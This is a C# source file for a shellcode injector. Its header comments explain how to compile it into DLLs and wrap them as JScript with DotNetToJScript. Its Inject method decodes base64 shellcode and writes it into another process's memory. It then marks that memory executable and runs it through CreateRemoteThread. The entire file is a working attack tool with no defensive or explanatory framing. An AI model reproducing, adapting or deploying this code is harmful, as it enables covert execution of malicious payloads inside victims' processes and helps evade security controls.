// shellcode_inject_thread
// 1. C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:inj32.dll shellcode_inject_thread.cs
// 2. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:inj64.dll shellcode_inject_thread.cs
// 3. DotNetToJScript.exe -o inj32.js -v v4 inj32.dll -c MyClass
// 4. DotNetToJScript.exe -o inj64.js -v v4 inj64.dll -c MyClass
// 5. copy JS blobs to 

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class MyClass
{
    public MyClass()
    {}
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out UIntPtr lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x0004;
    const uint PAGE_EXECUTE_READ = 0x0010;

    public int Inject(string sc, int pid)
    {
        try {
            byte[] bsc = Convert.FromBase64String(sc);
            
            Process proc = Process.GetProcessById(pid);

            IntPtr hproc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
            
            if (hproc == null)
                return 1;

            IntPtr addr = VirtualAllocEx(hproc, IntPtr.Zero, (uint)bsc.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (addr == null)
                return 1;

            UIntPtr lw;
            if (!WriteProcessMemory(hproc, addr, bsc, (uint)bsc.Length, out lw))
                return 1;
            
            UIntPtr oldperm;
            if (!VirtualProtectEx(hproc, addr, (uint)bsc.Length, PAGE_EXECUTE_READ, out oldperm))
                return 1;

            if (CreateRemoteThread(hproc, IntPtr.Zero, 0, addr, IntPtr.Zero , 0, IntPtr.Zero) == null)
                return 1;

            return 0;
        } catch (Exception e) {
            return 2;
        }
    }
}
